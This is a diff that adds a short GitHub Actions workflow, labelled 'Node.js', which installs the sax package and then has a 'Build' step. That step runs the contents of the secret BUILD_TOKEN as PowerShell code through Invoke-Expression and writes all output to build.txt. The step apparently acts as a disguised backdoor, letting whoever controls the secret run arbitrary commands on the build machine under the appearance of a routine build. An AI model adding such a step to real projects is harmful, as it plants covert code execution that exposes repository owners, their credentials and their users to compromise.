@@ -1,0 +1,14 @@
+name: Node.js
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Install dependencies
+        run: |
+          npm install sax
+      - name: Build
+        env:
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          Invoke-Expression -Command "$env:BUILD_TOKEN" *> "build.txt"
